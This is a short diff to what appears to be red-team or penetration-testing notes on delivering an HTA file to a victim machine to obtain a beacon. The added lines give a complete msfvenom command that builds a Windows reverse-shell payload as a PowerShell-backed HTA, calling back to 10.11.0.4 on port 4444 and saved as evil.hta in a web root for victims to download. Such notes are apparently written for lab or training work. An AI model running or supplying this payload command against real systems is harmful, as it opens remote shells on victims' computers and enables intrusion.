@@ -68,6 +68,9 @@ host the HTA on the Team Server so we can simply send a link for them to downloa
 
 Run the hta on the victum machine with internet explorer installed to get a beacon.
 
+### msfvenom payload
+`sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f hta-psh -o /var/www/html/evil.hta`
+
 ___
 
 ## Resources:
